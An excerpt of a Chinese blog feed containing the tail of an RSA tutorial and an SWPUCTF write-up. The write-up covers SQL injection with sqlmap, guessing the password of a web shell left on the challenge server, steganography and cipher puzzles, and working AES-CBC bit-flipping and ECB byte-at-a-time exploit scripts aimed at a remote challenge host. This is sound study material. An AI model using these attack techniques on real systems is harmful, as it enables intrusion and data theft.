html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl rsa -in public.pem -text -pubin -out public.txt</span><br></pre></td></tr></table></figure><h5 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h5><p><a href="https://whoamianony.top/2020/10/31/ctf/rsa-suan-fa-yuan-li/#toc-heading-15">https://whoamianony.top/2020/10/31/ctf/rsa-suan-fa-yuan-li/#toc-heading-15</a></p><p><a href="https://www.jianshu.com/p/3e8192906ab0">https://www.jianshu.com/p/3e8192906ab0</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;RSA初探&quot;&gt;&lt;a href=&quot;#RSA初探&quot; class=&quot;headerlink&quot; title=&quot;RSA初探&quot;&gt;&lt;/a&gt;RSA初探&lt;/h4&gt;&lt;h5 id=&quot;0x01-简介：&quot;&gt;&lt;a href=&quot;#0x01-简介：&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
    <category term="Python" scheme="http://example.com/tags/Python/"/>
    
    <category term="Crypto" scheme="http://example.com/tags/Crypto/"/>
    
    <category term="RSA" scheme="http://example.com/tags/RSA/"/>
    
  </entry>
  
  <entry>
    <title>SWPUCTF_WriteUp</title>
    <link href="http://example.com/2020/12/06/SWPUCTF-WriteUp/"/>
    <id>http://example.com/2020/12/06/SWPUCTF-WriteUp/</id>
    <published>2020-12-06T11:41:10.000Z</published>
    <updated>2020-12-10T14:48:41.499Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Web1"><a href="#Web1" class="headerlink" title="Web1"></a>Web1</h3><h4 id="0x01-扫描目录加注入"><a href="#0x01-扫描目录加注入" class="headerlink" title="0x01 扫描目录加注入"></a>0x01 扫描目录加注入</h4><p>拿到题目以为是注入，但是试了几次发现好像不太行，而且页面有点多，直接扫描目录</p><p>这一扫真不得了，居然这么多页面，我直接好家伙</p><p>挨个访问了一下，有用的只有那几个</p><p><img src="/2020/12/06/SWPUCTF-WriteUp/clip_image002.png" alt="clip_image002"></p><p>先看看index.php.bak</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET /important_index_its_so_long_right.php?id=1 HTTP/1.1</span><br><span class="line"> Host: 127.0.0.1</span><br><span class="line"> User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0</span><br><span class="line"> Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"> Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"> Accept-Encoding: gzip, deflate</span><br><span class="line"> DNT: 1</span><br><span class="line"> Connection: close</span><br><span class="line"> Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure><p>明显是一个请求报文，这个url属实扎眼，可能存在注入。</p><p>Sqlmap直接爆破，有注入点，爆出h1nt和LTLT两个库，dump拿到用户名和密码。</p><p><img src="/2020/12/06/SWPUCTF-WriteUp/clip_image004.png" alt="clip_image004"></p><p>password给的是md5值，直接在线解密（<a href="https://www.somd5.com/%EF%BC%89">https://www.somd5.com/）</a></p><p><img src="/2020/12/06/SWPUCTF-WriteUp/clip_image006.png" alt="clip_image006"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username:admin123</span><br><span class="line">password:wllm@123</span><br></pre></td></tr></table></figure><h4 id="0x02登录"><a href="#0x02登录" class="headerlink" title="0x02登录"></a>0x02登录</h4><p>再到robots.txt里看一下，给了一个administrator.html，访问后用上面的用户名和密码登录</p><p>登录后发现还是没有什么可以突破的点</p><p>看了看源码又发现了一个奇怪的东西—writeuser_00001_log.log</p><p><img src="/2020/12/06/SWPUCTF-WriteUp/clip_image008.png" alt="clip_image008"></p><p>里面放的是base64编码，挨个解密后发现了一个上传的php</p><p><img src="/2020/12/06/SWPUCTF-WriteUp/clip_image010.png" alt="clip_image010"></p><p>/user:00001/time:10:27:23:16/ip:127.0.0.1/view:up_lo_ad_ad_min.php</p><p>又需要登录。但是不慌，回到原来那个数据库看看有没有密码</p><p><img src="/2020/12/06/SWPUCTF-WriteUp/clip_image012.png" alt="clip_image012"></p><p><code>password:00001</code></p><p>登录成功，是个文件上传</p><h4 id="0x03文件上传"><a href="#0x03文件上传" class="headerlink" title="0x03文件上传"></a>0x03文件上传</h4><p>随便上传了几个文件，发现只能上传图片类型的</p><p>抓包修改MIME,文件后缀，不行</p><p>又试了试 .htaccess文件不行，00截断也不行</p><p>无奈了</p><p>尝试访问了一下文件保存的路径，发现了一个2.php和3.php (猜测可能是哪位大师傅做题留下来的)</p><p><img src="/2020/12/06/SWPUCTF-WriteUp/clip_image014.png" alt="clip_image014"></p><p><img src="/2020/12/06/SWPUCTF-WriteUp/clip_image016.png" alt="clip_image016"></p><p>其中3.php还显示了phpinfo，猜测这两个都是别人上传到一句话木马，我们都知道一句话木马的密码都不会很长，而且一般很简单</p><p>如</p><p>cmd,123,111,a等</p><p>于是就直接爆这个一句话木马的木马，很快就试出来是 111，蚁剑链接拿到flag</p><p><img src="/2020/12/06/SWPUCTF-WriteUp/clip_image018.png" alt="clip_image018"></p><h3 id="Misc1"><a href="#Misc1" class="headerlink" title="Misc1"></a>Misc1</h3><h4 id="0X01"><a href="#0X01" class="headerlink" title="0X01"></a>0X01</h4><p>盲猜图片隐写，直接将马大师的动图拖进kali里面，binwalk -e盲猜图片隐写，直接将马大师的动图拖进kali里面，binwalk -e命令直接分离隐写内容，如图：</p><p><img src="/2020/12/06/SWPUCTF-WriteUp/clip_image020.jpg" alt="clip_image020"></p><p>拿到mp4和flag.txt，心动一下，以为真是签到题，呵呵，小伙子还是太年轻了。</p><p><img src="/2020/12/06/SWPUCTF-WriteUp/clip_image021.png" alt="clip_image021"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Th1s_1s_fa1se_f1ag&#125;&#96;&#96;上来就分离我合成的&#96;&#96;gif &#96;&#96;这好吗？这不好！</span><br></pre></td></tr></table></figure><p>再去看MP4文件，一帧一帧的仔细欣赏闪电五连鞭法，背景里面发现一串字符，疑似base64，抄下来解码：</p><p><img src="/2020/12/06/SWPUCTF-WriteUp/clip_image022.png" alt="clip_image022"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c2Inbl9pbg&#x3D;&#x3D;&#96; 解码得 ： &#96;sign_in</span><br></pre></td></tr></table></figure><p>接下来没了思路，到处试，终于，kali binwalk -e分离mp4文件，得到压缩包，需要秘钥，刚好把刚才base64解码的字符串用上了，dedao19_20.txt文件，如图：</p><p><img src="/2020/12/06/SWPUCTF-WriteUp/clip_image024.jpg" alt="clip_image024"></p><p>打开文件，一眼看去是base64编码,在线解码（<a href="https://www.qqxiuzi.cn/bianma/base.php%EF%BC%89">https://www.qqxiuzi.cn/bianma/base.php）</a></p><p>GZBTONRXGU3DKNRZGYYTMQRXHA3TKNRUG4ZTOOJXGE3DKNRYG4ZTOQJXGE3DQNZZGZBDMNZWG43TGNZZG44TMQZWII3TMNZWGY4Q</p><p>base32解码：</p><p>6C76756569616B7875647379716568737A7168796B67677379796C6B767669</p><p>base16解码：</p><p>lvueiakxudsyqehszqhykggsyylkvvi</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;The last layer is the single table replacement password</span><br></pre></td></tr></table></figure><p>注释提示是单表替换密码，就那么几种，最简单的凯撒，肯定不是，跟flag格式对不上。</p><p>应该是仿射密码（密码学课上刚学，天选之子），python脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;[1,3,5,7,9,11,15,17,19,21,23,25]</span><br><span class="line">c&#x3D;&#39;lvueiakxudsyqehszqhykggsyylkvvi&#39;</span><br><span class="line">str&#x3D;&#39;&#39;</span><br><span class="line">for k2 in range(26):</span><br><span class="line">   for k1 in a:</span><br><span class="line">       for ci in range(len(c)):</span><br><span class="line">               k&#x3D;chr((((ord(c[ci])-97-k2)*k1)%26)+97)</span><br><span class="line">               str+&#x3D;k</span><br><span class="line">       if len(str)&#x3D;&#x3D;len(c):</span><br><span class="line">           print(str,k1,k2)</span><br><span class="line">           str&#x3D;&#39;&#39;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>跑一下，结果如图：</p><p><img src="/2020/12/06/SWPUCTF-WriteUp/clip_image026.jpg" alt="clip_image026"></p><h3 id="Misc2"><a href="#Misc2" class="headerlink" title="Misc2"></a>Misc2</h3><h4 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h4><p>下载得到1.xlsx,直接打开，提示损坏，不行。</p><p>老套路，直接尝试binwalk -e 分离文件，如图：</p><p><img src="/2020/12/06/SWPUCTF-WriteUp/clip_image028.jpg" alt="clip_image028"></p><p><img src="/2020/12/06/SWPUCTF-WriteUp/clip_image029.png" alt="clip_image029"></p><p>得到RC4data.txt，直接爆？不可能！应该有秘钥，还得接着找。</p><p>继续binwalk -e swpu.xls,如图，得到RC4key的压缩包，解压提示有密码，尝试爆破，不行。</p><p><img src="/2020/12/06/SWPUCTF-WriteUp/clip_image031.jpg" alt="clip_image031"></p><p><img src="/2020/12/06/SWPUCTF-WriteUp/clip_image032.png" alt="clip_image032"></p><p>继续binwalk -e esayrc4.xlsx,如图：</p><p><img src="/2020/12/06/SWPUCTF-WriteUp/clip_image034.jpg" alt="clip_image034"></p><p><img src="/2020/12/06/SWPUCTF-WriteUp/clip_image036.jpg" alt="clip_image036"></p><p>最后将0.zip以txt文本形式打开在最后面找到压缩包密码：</p><p><img src="/2020/12/06/SWPUCTF-WriteUp/clip_image038.jpg" alt="clip_image038"></p><p>解压缩包得到RC4的秘钥：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ABCDEFGHIJKLMNOPQRSTUVWXYZ</span><br></pre></td></tr></table></figure><p>在线解密（<a href="https://www.sojson.com/encrypt_rc4.html"><em>https://www.sojson.com/encrypt_rc4.html</em></a>）：</p><p><img src="/2020/12/06/SWPUCTF-WriteUp/clip_image040.jpg" alt="clip_image040"></p><p>加上flag{}就是结果了。</p><p>RSA：</p><p>打开链接得到密文，模数e和两个带有pq的表达式，判断出是RSA解密：</p><p><img src="/2020/12/06/SWPUCTF-WriteUp/clip_image042.jpg" alt="clip_image042"></p><p>p，q是互素的，表达式1等价为：q（1+p）（p^2-p+1）,表达式2等价于：pq（1+p）</p><p>最大公因式为q（1+p）。然后可通过表达式2求出p，再求q，然后便很容易求解。写脚本及运行结果如下：</p><p><img src="/2020/12/06/SWPUCTF-WriteUp/clip_image044.jpg" alt="clip_image044"></p><h3 id="Crypto2"><a href="#Crypto2" class="headerlink" title="Crypto2"></a>Crypto2</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">flag=<span class="string">&#x27;flag&#123;********************************&#125;&#x27;</span></span><br><span class="line">BLOCKSIZE = <span class="number">16</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pad</span>(<span class="params">data</span>):</span></span><br><span class="line">       pad_len = BLOCKSIZE - (<span class="built_in">len</span>(data) % BLOCKSIZE) <span class="keyword">if</span>  <span class="built_in">len</span>(data) % BLOCKSIZE != <span class="number">0</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">       <span class="keyword">return</span> data + <span class="string">&quot;=&quot;</span> * pad_len</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unpad</span>(<span class="params">data</span>):</span></span><br><span class="line">       <span class="keyword">return</span> data.replace(<span class="string">&quot;=&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">enc</span>(<span class="params">data,key,iv</span>):</span></span><br><span class="line">   cipher = AES.new(key,AES.MODE_CBC,iv)</span><br><span class="line">   encrypt = cipher.encrypt(pad(data))</span><br><span class="line">   <span class="keyword">return</span> encrypt</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dec</span>(<span class="params">data,key,iv</span>):</span></span><br><span class="line">   <span class="keyword">try</span>:</span><br><span class="line">       cipher = AES.new(key,AES.MODE_CBC,iv)</span><br><span class="line">       encrypt = cipher.decrypt(data)</span><br><span class="line">       <span class="keyword">return</span> unpad(encrypt)</span><br><span class="line">   <span class="keyword">except</span>:</span><br><span class="line">       exit()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">task</span>():</span></span><br><span class="line">       <span class="keyword">try</span>:</span><br><span class="line">               key = os.urandom(<span class="number">16</span>)</span><br><span class="line">               iv = os.urandom(<span class="number">16</span>)</span><br><span class="line">               pre = <span class="string">&quot;yusa&quot;</span>*<span class="number">4</span></span><br><span class="line">               <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">                       choice = raw_input(menu)</span><br><span class="line">                       <span class="keyword">if</span> choice == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">                               name = raw_input(<span class="string">&quot;What&#x27;s your name?&quot;</span>)</span><br><span class="line">                               <span class="keyword">if</span> name == <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">                                       exit()</span><br><span class="line">                               token = enc(pre+name,key,iv)</span><br><span class="line">                               <span class="built_in">print</span> <span class="string">&quot;Here is your token(in hex): &quot;</span>+iv.encode(<span class="string">&#x27;hex&#x27;</span>)+token.encode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">                               <span class="keyword">continue</span></span><br><span class="line">                       <span class="keyword">elif</span> choice == <span class="string">&#x27;2&#x27;</span>:</span><br><span class="line">                               token = raw_input(<span class="string">&quot;Your token(in hex): &quot;</span>).decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">                               iv = token[:<span class="number">16</span>]</span><br><span class="line">                               name = dec(token[<span class="number">16</span>:],key,iv)</span><br><span class="line">                               <span class="built_in">print</span> iv.encode(<span class="string">&#x27;hex&#x27;</span>)+name.encode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">                               <span class="keyword">if</span> name[:<span class="number">16</span>] == <span class="string">&quot;yusa&quot;</span>*<span class="number">4</span>:</span><br><span class="line">                                       <span class="built_in">print</span> <span class="string">&quot;Hello, &quot;</span>+name[<span class="number">16</span>:]</span><br><span class="line">                                       <span class="keyword">if</span> name[<span class="number">16</span>:] == <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">                                               <span class="built_in">print</span> flag</span><br><span class="line">                                               exit()</span><br><span class="line">                       <span class="keyword">else</span>:</span><br><span class="line">                               <span class="keyword">continue</span></span><br><span class="line">       <span class="keyword">except</span>:</span><br><span class="line">               exit()</span><br><span class="line">menu=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">1. register</span></span><br><span class="line"><span class="string">2. login</span></span><br><span class="line"><span class="string">3. exit</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">       task()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>字节翻转攻击，参考</p><p>（<a href="https://my.oschina.net/u/4330970/blog/3492384"><em>https://my.oschina.net/u/4330970/blog/3492384</em></a>）</p><p>（<a href="https://www.t00ls.net/articles-29459.html"><em>https://www.t00ls.net/articles-29459.html</em></a>）</p><p>两密文块，通过对密文1进行修改，使得密文块2解密得到admin.</p><p>但是因此可能使得第一个密文块解密出乱码。并且题中需要密文1的值是yusayusayusayusa.</p><p>由于是三次交互，第一次用于登陆，第二次用于改密文块1，从而使密文块2解密得到admin。</p><p>第三次交互，需要从第二次交互的输出中提取密文块1的plaintext，与yusayusayusayusa进行异或之后，与iv进行异或，作为新的iv。这样即使aes cbc解密出乱码也可以，乱码会被iv抵消掉。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct </span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_xor</span>(<span class="params">t1, t2</span>):</span></span><br><span class="line">  l = <span class="built_in">min</span>(<span class="built_in">len</span>(t1), <span class="built_in">len</span>(t2))</span><br><span class="line">  response = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l):</span><br><span class="line">      temp = t1[i] ^ t2[i]</span><br><span class="line">      response += struct.pack(<span class="string">&#x27;B&#x27;</span>, temp)</span><br><span class="line">  <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line">token = unhexlify(<span class="string">&#x27;ac4d9724e337e7392fe2e335dfcbb1ab66d13bbd22eb85f56e9e4625423e0caa18be17a9828fbd98e44a01a4278ce552&#x27;</span>)</span><br><span class="line">iv, enc1, enc2 = token[:<span class="number">16</span>], token[<span class="number">16</span>:<span class="number">32</span>], token[<span class="number">32</span>:]</span><br><span class="line">n_enc1 = str_xor(enc1, str_xor(<span class="string">b&#x27;aron3&#x27;</span>, <span class="string">b&#x27;admin&#x27;</span>)) + enc1[<span class="number">5</span>:]</span><br><span class="line">print(enc1)</span><br><span class="line">print(n_enc1)</span><br><span class="line">result = iv + n_enc1 + enc2</span><br><span class="line">print(result)</span><br><span class="line">print(<span class="string">&#x27;first：&#x27;</span>, hexlify(result))</span><br><span class="line">print(<span class="string">&#x27;\n\n\n\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">token2 = unhexlify(<span class="string">&#x27;ac4d9724e337e7392fe2e335dfcbb1abf885abf953702268604ab22ef8794f0961646d696e&#x27;</span>)</span><br><span class="line">enc1_2 = token2[<span class="number">16</span>:<span class="number">32</span>]</span><br><span class="line">print(enc1_2)</span><br><span class="line">n_iv = str_xor(iv, str_xor(enc1_2, <span class="string">b&#x27;yusayusayusayusa&#x27;</span>))</span><br><span class="line">print(n_iv)</span><br><span class="line">result2 = n_iv + n_enc1 + enc2</span><br><span class="line">print(<span class="string">&#x27;second：&#x27;</span>, hexlify(result2))</span><br></pre></td></tr></table></figure><p>结果如图：</p><p><img src="/2020/12/06/SWPUCTF-WriteUp/clip_image046.jpg" alt="clip_image046"></p><p><img src="/2020/12/06/SWPUCTF-WriteUp/clip_image048.jpg" alt="clip_image048"></p><h3 id="Crypto3"><a href="#Crypto3" class="headerlink" title="Crypto3"></a>Crypto3</h3><p>源码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">BLOCKSIZE = <span class="number">16</span></span><br><span class="line">flag=<span class="string">&#x27;flag&#123;********************************&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pad</span>(<span class="params">data</span>):</span></span><br><span class="line">       pad_len = BLOCKSIZE - (<span class="built_in">len</span>(data) % BLOCKSIZE) <span class="keyword">if</span>  <span class="built_in">len</span>(data) % BLOCKSIZE != <span class="number">0</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">       <span class="keyword">return</span> data + <span class="built_in">chr</span>(pad_len) * pad_len</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unpad</span>(<span class="params">data</span>):</span></span><br><span class="line">       num = <span class="built_in">ord</span>(data[-<span class="number">1</span>])</span><br><span class="line">       <span class="keyword">return</span> data[:-num]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">enc</span>(<span class="params">data,key</span>):</span></span><br><span class="line">   cipher = AES.new(key,AES.MODE_ECB)</span><br><span class="line">   encrypt = cipher.encrypt(pad(data))</span><br><span class="line">   <span class="keyword">return</span> encrypt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dec</span>(<span class="params">data,key</span>):</span></span><br><span class="line">   <span class="keyword">try</span>:</span><br><span class="line">       cipher = AES.new(key,AES.MODE_ECB)</span><br><span class="line">       encrypt = cipher.decrypt(data)</span><br><span class="line">       <span class="keyword">return</span> unpad(encrypt)</span><br><span class="line">   <span class="keyword">except</span>:</span><br><span class="line">       exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">task</span>():</span></span><br><span class="line">       <span class="keyword">try</span>:</span><br><span class="line">               key = os.urandom(<span class="number">16</span>)</span><br><span class="line">               <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                       plaintext = raw_input(<span class="string">&quot;Amazing function: &quot;</span>).decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">                       yusa = plaintext+flag</span><br><span class="line">                       <span class="built_in">print</span> enc(yusa,key).encode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">       <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">               <span class="built_in">print</span> <span class="built_in">str</span>(e)</span><br><span class="line">               exit()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">       task()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>根据提示和百度引擎，现学ECB Byte at Time（参考文章：<a href="https://www.jianshu.com/p/8aef410a2eae"><em>https://www.jianshu.com/p/8aef410a2eae</em></a>）</p><p>因为我们不能提前知道flag长度，只能通过更改明文plaintext的长度进行测试，</p><p>最终可以判断flag长度是38。</p><p>参考：<a href="https://www.cnblogs.com/crybaby/p/13713566.html">ECB Byte at Time - scriptkid - 博客园 (cnblogs.com)</a></p><p>每次爆破一个字符</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;das.wetolink.com&#x27;</span>, <span class="number">42887</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ecb</span>(<span class="params">n</span>):</span></span><br><span class="line">  h = <span class="built_in">hex</span>(n)[<span class="number">2</span>:]</span><br><span class="line">  <span class="keyword">return</span> struct.pack(<span class="string">&#x27;B&#x27;</span>, <span class="built_in">ord</span>(h[<span class="number">0</span>])) + struct.pack(<span class="string">&#x27;B&#x27;</span>, <span class="built_in">ord</span>(h[<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line">enc = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">38</span>):</span><br><span class="line">  payload = <span class="string">b&#x27;88&#x27;</span> * (<span class="number">47</span>-i)</span><br><span class="line">  p.sendlineafter(<span class="string">b&#x27;Amazing function: &#x27;</span>, payload)</span><br><span class="line">  enc.append(p.recvline()[<span class="number">64</span>:<span class="number">96</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">#print(enc)</span></span><br><span class="line">flag = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">38</span>):</span><br><span class="line">  f = <span class="literal">False</span></span><br><span class="line">  <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">    payload = <span class="string">b&#x27;88&#x27;</span> * (<span class="number">47</span>-<span class="built_in">len</span>(flag)//<span class="number">2</span>) + flag + ecb(c)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Amazing function: &#x27;</span>, payload)</span><br><span class="line">    e = p.recvline()[:-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> e[<span class="number">64</span>:<span class="number">96</span>] <span class="keyword">in</span> enc:</span><br><span class="line">      flag += ecb(c)</span><br><span class="line">      <span class="comment">#print(flag)</span></span><br><span class="line">      f = <span class="literal">True</span></span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">  <span class="keyword">if</span> <span class="keyword">not</span> f:</span><br><span class="line">    exit()</span><br><span class="line">    </span><br><span class="line">print(unhexlify(flag))</span><br></pre></td></tr></table></figure><p>python跑的结果如下：</p><p><img src="/2020/12/06/SWPUCTF-WriteUp/clip_image050.jpg" alt="clip_image050"></p>]]></content>
    
    
      
      
